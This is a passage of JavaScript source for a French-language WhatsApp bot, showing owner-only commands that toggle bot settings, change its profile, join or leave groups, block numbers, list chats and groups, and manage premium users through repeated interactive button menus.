                    replygckev(`Desactivey ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'pv-uniquement':
            case 'pv-unik':
                if (!TontonKev) return KevStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlypc = true
                    replygckev(`Activey ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlypc = false
                    replygckev(`Desactivey ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!TontonKev) return KevStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlyindia = true
                    replygckev(`Activey ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlyindia = false
                    replygckev(`Desactivey ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!TontonKev) return KevStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlyindo = true
                    replygckev(`Activey ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlyindo = false
                    replygckev(`Desactivey ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'mod-blocageauto':
                if (!TontonKev) return KevStickOwner()
                if (!text) return replygckev(`Example : ${prefix + command} 92`)
                global.autoblocknumber = text
                replygckev(`Blocage auto modifiey en ${text}`)
                break
                case 'mod-antiforeign':
                if (!TontonKev) return KevStickOwner()
                if (!text) return replygckev(`Example : ${prefix + command} 91`)
                global.antiforeignnumber = text
                replygckev(`Anti-foreign modifiey en ${text}`)
                break
			case 'lectureauto-statut':
    case 'lecture-statutauto':{
             if (!TontonKev) return KevStickOwner()
               
               if (args[0] === 'on') {
                  db.settings[botNumber].antiswview = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.settings[botNumber].antiswview = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anti-appel': {
             if (!TontonKev) return KevStickOwner()
               
               if (args[0] === 'on') {
                  db.settings[botNumber].anticall = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.settings[botNumber].anticall = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'reg-ecritureauto':
                if (!TontonKev) return KevStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autorecordtype = true
                    replygckev(`${command} Activey`)
                } else if (q === 'off') {
                    db.settings[botNumber].autorecordtype = false
                    replygckev(`${commande} Desactivey`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'reg-auto':
                if (!TontonKev) return KevStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autorecord = true
                    replygckev(`${command} Activey`)
                } else if (q === 'off') {
                    db.settings[botNumber].autorecord = false
                    replygckev(`${command} Desactivey`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'ecriture-auto':
                if (!TontonKev) return KevStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autotype = true
                    replygckev(`${command} Activee`)
                } else if (q === 'off') {
                    db.settings[botNumber].autotype = false
                    replygckev(`${command} Desactivee`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'lecture-auto':
                if (!TontonKev) return KevStickOwner()
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    replygckev(`${command} Activee`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    replygckev(`${command} Desactivee`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'auto-bio':
                if (!TontonKev) return KevStickOwner()
                
                if (q == 'on') {
                    db.settings[botNumber].autobio = true
                    replygckev(`${command} Activee`)
                } else if (q == 'off') {
                    db.settings[botNumber].autobio = false
                    replygckev(`${command} Desactivee`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'privey': case 'publique': case 'mode': {
                if (!TontonKev) return KevStickOwner()
                if (q == 'on') {
                Kev.public = true
                replygckev('*Activation du mode publique*')
                } else if (q == 'off') {
                Kev.public = false
                replygckev('*Activation du mode privey*')
                } else {
                	let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECTIONNER ↖️',
							sections: [{
								title: 'MODE',
								rows: [
									{ title: 'Publique', description: 'Usage Publique', id: `${prefix+command} on` },
									{ title: 'privey', description: 'Usage Privey', id: `${prefix+command} off` },
								]
							}]
						}
					}]
                	await Kev.sendButtonMsg(m.chat, 'MODE', Kevinoutimewisher, 'Veuillez selectionner', null, button, m);
                	}
                }
                break
			case 'mod-bio': case 'mod-botbio': {
				if (!TontonKev) return KevStickOwner()
				if (!text) return replygckev(`Where's the text??`)
				Kev.setStatus(q)
				replygckev(`*Bio modifiee en ${q}*`)
			}
			break
			case 'mod-botpp':
            case 'mod-pp':
            case 'mod-ppbot':
            case 'mod-ppbot':
                if (!TontonKev) return KevStickOwner()
                if (!quoted) return replygckev(`Veuillez Reponde A Une Image  ${prefix + command}`)
                if (!/image/.test(mime)) return replygckev(`Veuillez Reponde A Une Image  ${prefix + command}`)
                if (/webp/.test(mime)) return replygckev(`Veuillez Reponde A Une Image  ${prefix + command}`)
                var medis = await Kev.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Kev.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                } else {
                    var memeg = await Kev.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                }
                break
			case 'rejoindre': {
				if (!TontonKev) return KevStickOwner()
				if (!text) return replygckev('Veuillez entrer le lien du groupe !')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygckev('Lien Invalide!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				KevStickWait()
				await Kev.groupAcceptInvite(result).catch((res) => {
					if (res.data == 400) return replygckev('Group Introuvable ❗');
					if (res.data == 401) return replygckev('Le Bot retirey de ce groupe Group❗');
					if (res.data == 409) return replygckev('Le Bot Est deja present dans ce groupe ❗');
					if (res.data == 410) return replygckev('Lien reinitialisey❗');
					if (res.data == 500) return replygckev('Le Groupe est plein❗');
				})
			}
			break
			case 'sortir': case 'quitter': {
				if (!TontonKev) return KevStickOwner()
				await Kev.groupLeave(m.chat).then((res) => replygckev(jsonformat(res))).catch((err) => replygckev(jsonformat(err)))
			}
			break
			case 'bloquer': case 'block': {
				if (!TontonKev) return KevStickOwner()
				if (!text && !m.quoted) {
					replygckev(`Exemple: ${prefix + command} 237xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Kev.updateBlockStatus(numbersOnly, 'block').then((a) => replygckev(mess.done)).catch((err) => replygckev('Fail!'))
				}
			}
			break
			case 'debloquer': case 'unblokir': case 'openblock': case 'unblock': {
				if (!TontonKev) return KevStickOwner()
				if (!text && !m.quoted) {
					replygckev(`Example: ${prefix + command} 237xxx `)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Kev.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygckev(mess.done)).catch((err) => replygckev('Fail!'))
				}
			}
			break
			case 'liste-pv': {
				if (!TontonKev) return KevStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `⬣ *LISTE DES DISCUSSIONS PRIVEES*\n\nNombre Total : ${anu.length} Discussion\n\n`
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName
					teks += `${setv} *Nom :* ${nama}\n${setv} *Utilisateur :* @${i.split('@')[0]}\n${setv} *Discussion :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
				}
				Kev.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'liste-groupe': {
				if (!TontonKev) return KevStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				let teks = `⬣ *LISTE DE GROUPES*\n\nTotal Groupes : ${anu.length} Groupes\n\n`
				for (let i of anu) {
					let metadata = await Kev.groupMetadata(i)
					teks += `${setv} *Nom :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n${setv} *ID :* ${metadata.id}\n${setv} *Fais Le :* ${moment(metadata.creation * 1000).tz('Africa/Abidjan').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Membre :* ${metadata.participants.length}\n\n=====================\n\n`
				}
				Kev.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'creer-groupe': {
				if (!TontonKev) return KevStickOwner()
				if (!text) return replygckev(`Exemple:\n${prefix + command} *Nom Du Groupe*`)
				let group = await Kev.groupCreate(q, [m.sender])
				let res = await Kev.groupInviteCode(group.id)
				await Kev.sendMessage(m.chat, { text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Group Name :* *${q}*`, detectLink: true }, { quoted: m });
				await Kev.groupParticipantsUpdate(group.id, [m.sender], 'promote')
				await Kev.sendMessage(group.id, { text: 'Done' })
			}
			break
			case 'add-boss': case 'add-prem': case 'add-premium': {
				if (!TontonKev) return KevStickOwner()
				if (!text) return replygckev(`Exemple:\n${prefix + command} @tag|temps(s/m/h/d)`)
				let [teks1, teks2] = text.split`|`
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Kev.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return replygckev('Ce numero n est pas enregistrey sur whatsapp!')
				if (teks2) {
					prem.addPremiumUser(nmrnya, teks2, premium);
					replygckev(`@${nmrnya.split('@')[0]} add en temps que boss avec succes  pendant ${teks2}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.premium
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.premium
				} else {
					replygckev(`Veuillez entrer le temps !\nExemple: ${prefix + command} @tag|temps`)
				}
			}
			break
			case 'supp-boss': case 'supp-prem': case 'supp-premium': {
				if (!TontonKev) return KevStickOwner()
				if (!text) return replygckev(`Exemple:\n${prefix + command} @tag`)
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (prem.checkPremiumUser(nmrnya, premium)) {
					premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
					replygckev(`@${nmrnya.split('@')[0]} n est desormais plus un boss`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.free
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.free
				} else {
					replygckev(`@${nmrnya.split('@')[0]} n esr pas un boss❗`)
				}
			}
			break
			case 'liste-boss': case 'liste-prem': case 'listpremium': {
				if (!TontonKev) return KevStickOwner()
				let txt = `*------「 LIST PREMIUM 」------*\n\n`
				for (let userprem of premium) {
					txt += `➸ *Numero*: @${userprem.id.split('@')[0]}\n➸ *Limite*: ${global.db.users[userprem.id].limit}\n➸ *Solde*: ${global.db.users[userprem.id].uang.toLocaleString('id-ID')}\n➸ *Peremption*: ${formatDate(userprem.expired)}\n\n`
				}
				replygckev(txt)
			}
			break
			
			// Group Menu
			case 'ajouter': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!text && !m.quoted) {
					replygckev(`EXEMPLE: ${prefix + command} 237xxx`)
				} else {
